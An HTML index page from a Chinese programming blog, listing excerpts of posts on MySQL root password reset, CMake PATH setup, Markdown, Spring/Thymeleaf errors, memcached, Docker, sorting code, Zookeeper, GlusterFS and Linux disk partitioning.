<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49e26991a693026c39f2b8384e39eee6/" rel="bookmark">
			Mysql 8.0.13初始密码总是输入有误，所以干脆重置密码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		针对MYSQL8.0.13
1.打开命令窗口cmd，输入命令：net stop mysql，停止MySQL服务
2.开启跳过密码验证登录的MySQL服务，输入命令：
mysqld --console --skip-grant-tables --shared-memory
3.再打开一个新的cmd，输入登录命令：mysql -u root -p，输入密码处直接回车。
4.密码置为空，命令如下：
use mysql
update user set authentication_string=’'where user=‘root’;
5.退出mysql，执行命令：
quit
6.关闭以-console --skip-grant-tables --shared-memory 启动的MySQL服务.(ctrl + z 关闭步骤2即可）
7. 打开命令框，输入：net start mysql 启动MySQL服务。
8. 步骤4密码已经置空，所以无密码状态登录MySQL，输入登录命令：mysql -u root -p，输入密码处直接回车。
9. 设置新密码，输入
ALTER USER ‘root’@‘localhost’ IDENTIFIED BY ‘新密码’;
10.验证密码是否更改成功
输入quit，退出当前登录，输入登录命令：mysql -u root -p
输入密码，成功登录，到此，重置密码结束
转载于https://blog.csdn.net/qq_37144341/article/details/86152645
此贴为我个人学习参考借鉴记录使用，再写感谢原帖主人！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6be7316da7f2eb75ffff5b66b41df238/" rel="bookmark">
			Cmake安装遇到问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		命令：cmake --version
问题：
命令 'cmake' 可在 '/snap/bin/cmake' 处找到
由于/snap/bin 不在PATH 环境变量中，故无法找到该命令。
cmake：未找到命令
解决：
将/snap/bin/加入到环境变量就好了；
方法：
sudo vim /etc/profile 在末尾加入： export PATH=/snap/bin:$PATH #以上/snap/bin就是要加入环境变量的路径 #执行下面生效 source /etc/profile 验证：
cmake --version
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29c7d0578b50bfe8dbcfab15e1a2f9bd/" rel="bookmark">
			markdown实心圆点空心圆点、层级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		标题目录如何层次分明，需要用到实心圆点、空心圆点、方点，而这些需要用到表示无序列表的标记 * 或 - 或 + 。不同层级可以使用 Tab 键控制。
- 本程序的主要内容。 - 调用接口 align_api.py - predict 用于生成预测结果 - 输入文件 - 输出文件 - content_align - 用于字段 - sample_api - 用于任意词 注意
无序列表标记和后面的文字之间要有一个空格隔开。
https://www.cnblogs.com/crazyant007/p/4220066.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/107285a60df9f5fc42b0bc01ddf59132/" rel="bookmark">
			SpringBoot&#43;thymeleaf出现SpelEvaluationException: EL1007E: Property or field ‘data‘ canno be found on n
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今早打开昨天的项目，加了一个小功能，然后项目就崩了。主要是这个功能和这里一点关系都没有。
明明昨天晚上睡觉前都还好好的，今天一打开连首页都访问不了。崩溃。
花了一个多小时解决完这个问题，复盘错误时，把它还原成出错时的样子时它竟然又好了。我怀疑它在搞我心态。编程是门玄学问题。
来看看这个奇奇怪怪的bug吧
网页报错500
控制台：
```org.thymeleaf.exceptions.TemplateInputException: An error happened during template parsing (template: "class path resource [templates//index.html]") 再看详细错误信息：
Caused by: org.attoparser.ParseException: Exception evaluating SpringEL expression: "map.user.headerUrl" (template: "/index" - line 123, col 12) at org.attoparser.MarkupParser.parseDocument(MarkupParser.java:393) at org.attoparser.MarkupParser.parse(MarkupParser.java:257) at org.thymeleaf.templateparser.markup.AbstractMarkupTemplateParser.parse(AbstractMarkupTemplateParser.java:230) ... 48 common frames omitted Caused by: org.thymeleaf.exceptions.TemplateProcessingException: Exception evaluating SpringEL expression: "map.user.headerUrl" (template: "/index" - line 123, col 12) Caused by: org.springframework.expression.spel.SpelEvaluationException: EL1008E: Property or field 'headerUrl' cannot be found on null 这是按照提示找到的index.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/107285a60df9f5fc42b0bc01ddf59132/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6264cec17b93c9ebf5341b7501b8c15/" rel="bookmark">
			如何获取EMMC内存大小
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何获取EMMC内存大小 类别 需求
索引类别 获取EMMC内存大小
问题描述 对应无法得知EMMC总内存的大小，基于这个问题所写的代码。
代码关联 #define PATH_MAX_STRING_SIZE 256 #define BLKGETSIZE64 _IOR(0x12,114,size_t) #define BLKGETSIZE _IO(0x12,96) unsigned long rtk_get_size_emmc(void) { int fd; unsigned long long v64; unsigned long longsectors; char *pblock_name = "/dev/block/mmcblk0"; fd = open(pblock_name, O_RDWR|O_SYNC); if(fd &lt; 0) { return -1; } if (ioctl(fd, BLKGETSIZE64, &amp;v64) == 0) { /* Got bytes, convert to 512 byte sectors */ v64 &gt;&gt;= 9; if (v64 != (unsigned long)v64) { ret_trunc: /* Not only DOS, but all other partition tables * we support can't record more than 32 bit * sector counts or offsets */ v64 = (unsigned long)-1L; } close(fd); return v64; } /* Needs temp of type long */ if (ioctl(fd, BLKGETSIZE, &amp;longsectors)) { /* Perhaps this is a disk image */ unsigned long sz = lseek(fd, 0, SEEK_END); longsectors = 0; if (sz &gt; 0) longsectors = (unsigned long)sz / 512; lseek(fd, 0, SEEK_SET); } if (sizeof(long) &gt; sizeof(unsigned long) &amp;&amp; longsectors !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6264cec17b93c9ebf5341b7501b8c15/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76aabad676871be26311040f2bb140f1/" rel="bookmark">
			memcache服务架构搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一. 案例设计二. memcache服务端设置2.1 编译安装libevent-2.1.8-stable2.2 编译安装memcached-1.5.62.3 memcache服务端数据操作 三. 客户端设置3.1 客户端需要安装LAMP架构3.2 安装memcache-2.2.7 四. 测试 一. 案例设计 需要安装的软件 memcache服务端：libevent-2.1.8 memcached-1.5.6 memcahe客户端：LAMP架构 memcache-2.2.7 二. memcache服务端设置 2.1 编译安装libevent-2.1.8-stable #安装编译器 [root@localhost libevent-2.1.8-stable]# yum -y install gcc gcc-c++ make //make其实是默认安装的有 #解压事件 [root@localhost ~]# cd opt [root@localhost opt]# tar zxvf libevent-2.1.8-stable.tar.gz [root@localhost opt]# cd libevent-2.1.8-stable/ #./configure配置 [root@localhost libevent-2.1.8-stable]# ./configure --prefix=/usr/local/libevent [root@localhost libevent-2.1.8-stable]# make &amp;&amp; make install 2.2 编译安装memcached-1.5.6 #解压memcached-1.5.6 [root@localhost libevent-2.1.8-stable]# cd ../memcached-1.5.6/ #./configure配置 [root@localhost memcached-1.5.6]# .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/76aabad676871be26311040f2bb140f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9792fa00dec876d35cdebb342b9c0be0/" rel="bookmark">
			部署 vue 项目到 github 并实现在线预览
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、打包 Vue 项目2、提交 Vue 项目3、在线预览 Vue 项目4、Git 操作命令 1、打包 Vue 项目 在命令行执行 npm run build 后，项目的目录下会生成一个 dist 文件夹，它里面又包含一个 static 文件夹和一个 index.html 文件，这是 webpack 最终打包好的文件。
Microsoft Windows [版本 10.0.18362.1139] (c) 2019 Microsoft Corporation。保留所有权利。 D:\Code\vue\vue_calendar&gt;npm run build &gt; vue_calendar@1.0.0 build D:\Code\vue\vue_calendar &gt; node build/build.js Hash: 34232418578135455721 Version: webpack 3.12.0 Time: 51477ms Asset Size Chunks Chunk Names static/js/vendor.1489dda13598d34ee312.js 123 kB 0 [emitted] vendor static/js/app.8826f65284e2791f1e4c.js 9.83 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js 857 bytes 2 [emitted] manifest static/css/app.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9792fa00dec876d35cdebb342b9c0be0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/691785a4d9f818c2d98101adae7bd94e/" rel="bookmark">
			springcloud引入子项目的建议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		springcloud引入子项目建议 例如B项目需要引入A项目 1. 在B项目的setting.gradle中添加 includeBuild '../zc-common' 2. 在B项目的build.gradle中添加 假如A项目的包名为com.test
implementation ‘包名:项目名:版本号’
包名在A项目的build.gradle文件中属性为group版本号在A项目的build.gradle文件中属性为version implementation 'com.test:A:0.0.1-SNAPSHOT' demo：https://github.com/zichen1019/SpringCouldDemo
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/406cb19987107e92bfcadd43e86976c9/" rel="bookmark">
			输入一个待排序的序列，分别用选择排序和起泡排序两种排序方法将其变换成有序的序列。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		选择排序：
#include &lt;stdio.h&gt; //对含有n个数的数组进行遍历 void visit(int r[],int n){ for(int i=0;i&lt;n;i++) printf("%4d ",r[i]); printf("\n"); } //选择排序 void SelectSort(int r[ ], int n){ int i, j, index, temp; int compare = 0,move = 0; for (i = 0; i &lt; n - 1; i++) { //对n个记录进行n-1趟选择排序 index = i; for (j = i + 1; j &lt; n; j++){ //在无序区中查找最小记录 if (r[j] &lt; r[index]) index = j; compare++; //比较次数增加1 } if (index !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/406cb19987107e92bfcadd43e86976c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c4be00ca9f2670e8d0203328fcbf1f8/" rel="bookmark">
			激光样式（蓝桥杯）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		x星球的盛大节日为增加气氛，用30台机光器一字排开，向太空中打出光柱。
安装调试的时候才发现，不知什么原因，相邻的两台激光器不能同时打开！
国王很想知道，在目前这种bug存在的情况下，一共能打出多少种激光效果？
显然，如果只有3台机器，一共可以成5种样式，即：
全都关上（sorry, 此时无声胜有声，这也算一种）
开一台，共3种
开两台，只1种
30台就不好算了，国王只好请你帮忙了。
要求提交一个整数，表示30台激光器能形成的样式种数。
注意，只提交一个整数，不要填写任何多余的内容。
分析
深度优先搜索，找出每一种满足条件的解。
#include&lt;iostream&gt; using namespace std; int a[30]; int ans; void dfs(int index){ if (index == 30){ ans++; return; } if (index == 0 || a[index - 1] == 0){ //第一个机器或该机器的前一个为暗，此时该机器可为暗也可为亮 //为暗 dfs(index + 1); //为亮 a[index] = 1; dfs(index + 1); a[index] = 0; } else{ //该机器的前一个为亮，该机器只能为暗 dfs(index + 1); } } int main(){ dfs(0); cout &lt;&lt; ans &lt;&lt; endl; system("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2c4be00ca9f2670e8d0203328fcbf1f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f81e7a686680d03d0d8fc531796687da/" rel="bookmark">
			精通高并发与多线程，却不会用ThreadLocal？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，我是小菜，一个渴望在互联网行业做到蔡不菜的小菜。可柔可刚，点赞则柔，白嫖则刚！
死鬼~看完记得给我来个三连哦！
本文主要介绍 ThreadLocal 的使用
如有需要，可以参考
如有帮助，不忘 点赞 ❥
微信公众号已开启，小菜良记，没关注的同学们记得关注哦！
之前我们有在并发系列中提到 ThreadLocal 类和基本使用方法，那我们就来看下 ThreadLocal 究竟是如何使用的！
ThreadLocal 简介 概念 ThreadLocal 类是用来提供线程内部的局部变量。这种变量在多线程环境下访问（get 和 set 方法访问）时能保证各个线程的变量相对独立于其他线程内的变量。 ThreadLocal 实例通常来说都是 private static 类型的，用于关联线程和上下文。
作用 传递数据 提供线程内部的局部变量。可以通过 ThreadLocal 在同一线程，不同组件中传递公共变量。
线程并发 适用于多线程并发情况下。
线程隔离 每个线程的变量都是独立的，不会相互影响。
ThreadLocal 实战 1. 常见方法 ThreadLocal () 构造方法，创建一个 ThreadLocal 对象
void set (T value) 设置当前线程绑定的局部变量
T get () 获取当前线程绑定的局部变量
void remove () 移除当前线程绑定的局部变量
2. 为什么要使用 ThreadLocal 首先我们先看一组并发条件下的代码场景：
@Data public class ThreadLocalTest { private String name; public static void main(String[] args) { ThreadLocalTest tmp = new ThreadLocalTest(); for (int i = 0; i &lt; 4; i++) { Thread thread = new Thread(() -&gt; { tmp.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f81e7a686680d03d0d8fc531796687da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c59d5ade752266071f5fb2d583fdbc05/" rel="bookmark">
			Docker镜像下载及容器启动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
Docker镜像和容器安装
Docker 常用命令
VI命令安装
进入容器脚本 nsenter
Docker镜像和容器安装 版本要求：系统为64位、系统内核版本为 3.10 以上查看linux系统版本，使用 lsb_release -a ，若出现未知的命令，先使用yum安装 redhat-lsb # yum 安装redhat-lsb yum install -y redhat-lsb # 查看centos版本 lsb_release -a 系统内核版本查看 uname -r
查看是否已安装docker列表 我这个是已经安装了的截图 yum list installed | grep docker
安装docker yum -y install docker , y表示不询问安装，直到安装成功，安装完后再次查看安装列表
启动docker systemctl start docker
查看docker服务状态 systemctl status docker
说明： Docker安装成功
搜索centos镜像 docker search centos ， 第一条是官方的，引用次数最多，stars
获取 centos 镜像 docker pull centos
查看镜像 docker images
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c59d5ade752266071f5fb2d583fdbc05/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd63da905571b5f884f8c0dc159a22b5/" rel="bookmark">
			Typora的简单使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Tyora的简单使用说明 Typora使用教程 Typora官方下载网站：https://typora.io/ 1.标题
一个#号代表一级标题，两个##代表二级标题，依次类推，一共有六级标题。（注意：你的#要与后边写的内容之间留有空格）
2.字体
加粗：在文本左右各添加两个星号 (加粗)
斜体：在要变为斜体的文本左右各添加一个星号即可。（斜体）
斜体加粗：在要变为斜体的文本左右各添加三个星号即可。（斜体加粗）
删除线：在要添加删除线的左右各添加两个波浪线。（删除线）
高亮：在要变成高亮的文本前后各添加两个等于号。（高亮）
3.列表
无序列表:+笔记（不一定是+号，也可以是-号或*号）
（一个+号和空格，就会显示一个小圆点了） 无序列表二 无序列表三 有序列表：（注意.与列之间有一个空格）和word的列表一样
有序列表一
有序列表二
有序列表三
4.引用
用&gt;符号，用&gt;符号的多少进行缩进。（和#标题的类似）
5.分割线
连续打几个连字符即是分割线（------）
6.下划线
下划线：在把需要下划线的文本两个尖括号中，两个尖括号中各有一个u，同时第二个u前面好有个左下划线。（ ）
7.表格
只输入表头根据扩展选项就可以创建出一个表格|MON||TUE||WED||THU||FRI||SAT||SUN|回车。
可以自由该表行数和列数。
8.代码块
单行代码：用``符号(跟波浪线在一起的那个，tab上边小的，类似中文下的顿号，英文状态下必须是）
System.out.println("helloworld")
多行代码：```连用三个（同样的符号）可以选择代码类型在代码块的右下角
package cn.jishi2; import java.util.Scanner; //分解质因数 public class Zhiyinshu { public static void main(String[] args) { Scanner sc=new Scanner(System.in); System.out.println("请输入一个正整数："); int i=sc.nextInt(); for(int j=2;j&lt;=i;j++){ while (i!=j){ if(i%j==0){ System.out.println(j+"*"); i=i/j; }else{ break; } } } System.out.println(i); } } 9.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd63da905571b5f884f8c0dc159a22b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f953718e7afd3c37329303e4c7c60b29/" rel="bookmark">
			【信息学奥赛一本通】网址链接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OJ网址：http://ybt.ssoier.cn:8088/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/609881b7dc6ed33d7087bfb22afc8479/" rel="bookmark">
			将一个数M随机分为N份，并限制每份的大小
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		将一个数M随机分为N份，并限制每份的大小 需求场景：
-在活动开发中将50000个金币分为1000个金币红包，每个红包数额在8~188之间。
实现代码：
/** * 将一个数M随机分为N份，并限制每份的大小 * @param totalNum 总金币数 * @param count 分成的数量 * @param leftNum 区间的极小值（包含） * @param rightNum 区间的极大值（包含） * @return * @author lei.yan004 */ public List&lt;Integer&gt; randomAlloter(int totalNum, int count, int leftNum, int rightNum) { if (count * rightNum &lt; totalNum) { // 总金币数不能大于极大值*数量，否则无法将金币分完，造成死循环 totalNum = count * rightNum; } if (count * leftNum &gt; totalNum) { // 总金币数不能小于极小值*数量，否则无法将金币将不足，造成死循环 totalNum = count * leftNum; } int useNum = 0;// 使用的数量 List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); // 随机生成count个 for (int i = 0; i &lt; count; i++) { int round = (int) Math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/609881b7dc6ed33d7087bfb22afc8479/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d17d31068480972932a144d54a7ce077/" rel="bookmark">
			Spring Boot参考指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring Boot参考指南
[https://www.springcloud.cc/spring-boot.html]
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d8d3b91b389c402c6934f9b24ef7a35/" rel="bookmark">
			hadoop、hive、hbase的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hadoop、hive、hbase的区别
最近开始自学大数据，肯定免不了hadoop、hive、hbase这些东西。
此处把自己对这3个的理解记录一下：
1、hadoop：它是一个分布式计算+分布式文件系统，前者其实就是MapReduce，后者是HDFS。后者可以独立运行，前者可以选择性使用，也可以不使用
2、hive：通俗的说是一个数据仓库，仓库中的数据是被hdfs管理的数据文件，它支持类似sql语句的功能，你可以通过该语句完成分布式环境下的计算功能，hive会把语句转换成MapReduce，然后交给hadoop执行。这里的计算，仅限于查找和分析，而不是更新、增加和删除。它的优势是对历史数据进行处理，用时下流行的说法是离线计算，因为它的底层是MapReduce，MapReduce在实时计算上性能很差。它的做法是把数据文件加载进来作为一个hive表（或者外部表），让你觉得你的sql操作的是传统的表。
3、hbase：通俗的说，hbase的作用类似于数据库，传统数据库管理的是集中的本地数据文件，而hbase基于hdfs实现对分布式数据文件的管理，比如增删改查。也就是说，hbase只是利用hadoop的hdfs帮助其管理数据的持久化文件（HFile），它跟MapReduce没任何关系。hbase的优势在于实时计算，所有实时数据都直接存入hbase中，客户端通过API直接访问hbase，实现实时计算。由于它使用的是nosql，或者说是列式结构，从而提高了查找性能，使其能运用于大数据场景，这是它跟MapReduce的区别。
总结：
hadoop是hive和hbase的基础，hive依赖hadoop，而hbase仅依赖hadoop的hdfs模块。
hive适用于离线数据的分析，操作的是通用格式的（如通用的日志文件）、被hadoop管理的数据文件，它支持类sql，比编写MapReduce的java代码来的更加方便，它的定位是数据仓库，存储和分析历史数据
hbase适用于实时计算，采用列式结构的nosql，操作的是自己生成的特殊格式的HFile、被hadoop管理的数据文件，它的定位是数据库，或者叫DBMS
最后补充一下：hive可以直接操作hdfs中的文件作为它的表的数据，也可以使用hbase数据库作为它的表
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b8f96a44c45f70e0bb6c995e42c5f9a/" rel="bookmark">
			GlusterFS 分布式文件系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一. GlusterFS概述1.1 GlusterFS简介1.2 GlusterFS特点1.3 GlusterFS术语1.4 模块化堆栈式的架构 二. GlusterFS工作原理2.1 GlusterFS工作流程2.2 弹性HASH算法 三. GlusterFS的卷类型3.1 分布卷3.2 条带卷3.3 复制卷3.4 分布式条带卷3.5 分布式复制卷 四. 部署群集环境4.1 案列设计4.2 四台服务器中操作4.21 关闭防火墙和selinux,设置hosts文件4.22 执行脚本使四块磁盘自动分区，格式化，挂载4.23 以下只介绍其中一个节点的配置方法，另外的三个节点配置是一样的 五. 创建卷、部署客户端、测试文件系统5.1 配置hosts文件，不配置挂载时无法识别node5.2 配置yum源5.3 挂载5.4 测试 六. 其他维护命令 一. GlusterFS概述 1.1 GlusterFS简介 开源的分布式文件系统由存储服务器，客户端以及NFS/Samba存储网关组成无元数据服务器 1.2 GlusterFS特点 扩展性和高性能高可用性全局统一命名空间弹性卷管理基于标准协议 1.3 GlusterFS术语 Brick:存储块，存储节点Volume:逻辑卷FUSE:存在于客户端VFS:虚拟文件系统Glusterd:集群 1.4 模块化堆栈式的架构 模块化堆栈式的架构通过对模块的组合，实现复杂的功能 二. GlusterFS工作原理 2.1 GlusterFS工作流程 1.客户端或应用程序通过Gluster的挂载点访问数据：application2.linux系统内核通过VFS API收到请求并处理：VFS3.VFS将数据据递交给FUSE内核文件系统，fuse文件系统则是将数据通过
/dev/fuse设备文件递交给了GlusterFS client 端：fuse----/dev/fuse4.GlusterFS client 收到数据后，client 根据配置文件的配置
对数据进行处理：GlusterFS client5.通过网络将数据传递至远端的GlusterFS Server,并且将数据写入到服务器存储设备上：TCP or IB -----GlusterFS server----VFS------EXT4 2.2 弹性HASH算法 通过HASH算法得先计算文件的所需的存储空间的大小 根据所需的空间分配合理的存储位置依赖于哈希算法到一个32位的整数访问文件时，通过计算该文件的HASH值，从而对应到Brick存储空间哈希算法也可以用来验证数据的完整性 划分为N个连续的子空间，每个空间对应一个Brick弹性HASH算法的优点 保证数据平均分布在每一个Brick中：安全性，把数据拆成多份，存到不同的节点中去解决了对元数据服务器的依赖，进而解决了单点故障以及访问瓶颈 三.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b8f96a44c45f70e0bb6c995e42c5f9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0afc0df4387b6adf6eaf32262b2bbd9/" rel="bookmark">
			Zookeeper学习第一天
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 前言一、zookeeper简介1.1 zookeeper官网：1.2 zookeeper应用场景1.2.1 维护配置信息1.2.2 分布式锁服务1.2.3 集群管理 前言 自己曾经使用zookeeper用来做节点管理，时间久了，想系统的重新学习一遍。今天开始将对zookeeper的简介、数据模型、单机安装，常用shell命令，Acl权限控制、javaApi这几个方面全面的了解zookeeper
一、zookeeper简介 1.1 zookeeper官网： 因为篇幅这里只取了官网的一部分，大意就是zookeeper是开发维护一个高可靠的分布协调开源服务器。
zooKeeper由雅虎研究院开发，是Google Chubby的开源实现，后来托管到Apache，于2010年11月正式成为Apache的顶级项目。
大数据生态系统里的很多组件的命名都是某种动物或者昆虫，比如hadoop就是🐘，hive就是🐝。zookeeper即动物园管理者，顾明司仪就是管理大数据生态系统各组件的管理员，如下图所示：
1.2 zookeeper应用场景 zookeeper是一个经典的分布式数据一致性解决方案，致力于为分布式应用提供一个高性能、高可用、且具有严格顺序访问控制能力的分布式协调存储服务。
维护配置信息分布式锁服务集群管理生成分布式唯一ID 1.2.1 维护配置信息 java编程经常会遇到配置项，比如数据库的url、shcema、user和password等。通常这些配置项我们会放置在配置文件中，在讲配置文件放置在服务器上当需要更改配置项时，需要去服务器上修改对应的配置文件。但是随着分布式系统的兴起，由于许多服务都需要使用到该配置文件，因此又必须保证该配置服务的高可用性（high availability）和各台服务器上配置数据的一致性。通常会将配置文件部署在一个集群上，然而一个集群动辄上千台服务器，此时如果在一台台服务器逐个修改配置文件那将是非常繁琐且危险的操作，因此需要一种服务，能够高效快速且可靠地完成配置项的更改等操作，并能够保证各配置项在每一台服务器上的数据一致性。
zookeeper就可以提供这样一种服务，其使用Zab这种一致性协议来保证一致性。现在有很多开源项目使用zookeeper来维护配置，比如在hbase中，客户端就是连接一个zookeeper，获得必要的hbase集群的配置信息，然后才可以进一步操作。还有在开源的消息队列kafka中，也使用zookeeper来维护broker的信息。在alibaba开源的soa框架dubbo中也广泛的使用zookeeper管理一些配置来实现服务治理。
1.2.2 分布式锁服务 一个集群是一个分布式系统，由多台服务器组成。为了提高并发度和可靠性，多台服务器上运行着同一种服务。当多个服务在运行时就需要协调各服务的进度，有时候需要保证当某个服务在进行某个操作时，其他的服务都不能进行该操作，即对该操作进行加锁，如果当前机器挂掉后，释放锁并fail over到其他的机器继续执行该服务。
1.2.3 集群管理 一个集群有时会因为各种软硬件故障或者网络故障，出现某些服务器挂掉而被移除集群，而某些服务器加入到集群中的情况，zookeeper会将这些服务器加入/移出的情况通知给及群众的其他正常工作的服务器，以及时调整存储和计算等任务的分配和执行等。此外zookeeper还会对故障的服务器做出诊断并尝试修复。
1.2.4 生成分布式唯一ID
在过去的单库单表型系统中，通常可以使用数据库字段自带的auto_increment
属性来自动为每条记录生成一个唯一的ID。但是分库分表后，就无法在依靠数据库的auto_increment属性来唯一标识一条记录了。此时我们就可以用zookeeper在分布式环境下生成全局唯一ID。做法如下：每次要生成一个新Id时，创建一个持久顺序节点，创建操作返回的节点序号，即为新Id，然后把比自己节点小的删除即可。
1.3 zookeeper的设计目标
zookeeper致力于为分布式应用提供一个高性能，高可用，且具有严格顺序访问控制能力的分布式协调服务
1.3.1 高性能
zookeeper将全量数据存储在内存中，并直接服务于客户端的所有非实物请求，尤其适用于以读为主的引用场景
1.3.2 高可用
zooKeeper一般以集群的方式对外提供服务，一般3~5台机器就可以组成一个可用的zookeeper集群了，每台机器都会在内存中维护当前的服务状态，并且每台机器之间都相互保持着通信。只要集群中超过一般的机器都能够正常工作，那么整个集群都能够正常对外服务。
1.3.3 严格顺序访问
对于来自客户端的每个更新请求，zookeeper都会分配一个全局唯一的递增编号，这个编号反映了所有事物操作的先后顺序。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d72b8e9e0c68aabd7ac0c219ebba3a9/" rel="bookmark">
			Linux磁盘分区、格式化相关操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、sda、sdb是磁盘，sda1、sda2、sda3, sdb1是分区
2、检查哪块磁盘未分区，lsblk命令
由上图可知，我这个系统上有两个磁盘sda和sdb：
对sda磁盘进行分区，得到sda1、sda2、sda3，且三个分区的大小正好等于sda的大小，所以sda磁盘没有剩余的未分区容量了；
对磁盘sdb进行分区，得到分区sdb1，sdb1为10M ，而磁盘sdb为2G，所以sdb还有1.99G未分区的磁盘
如果没有未分区的磁盘，则需要删除一个已有的分区，数据宝贵，谨慎删除。
3、对/dev/sdb磁盘进行分区
说明：m-显示所有命令
n-新增一个分区
p-新增的分区类型为主分区
partition number:为分区号
first sector: 默认回车即可
+10M表示新分区的大小为10M
p:打印分区信息，可以看到/dev/sdb2为新增的分区
w：保存退出
4、通知操作系统，分区表已经改变
5、将新分区格式化为ext4
6、挂载新分区
7、查看到当前系统上所有磁盘的挂载信息，使用mount/df -T命令查看新分区及其文件系统类型, df -h查看大小
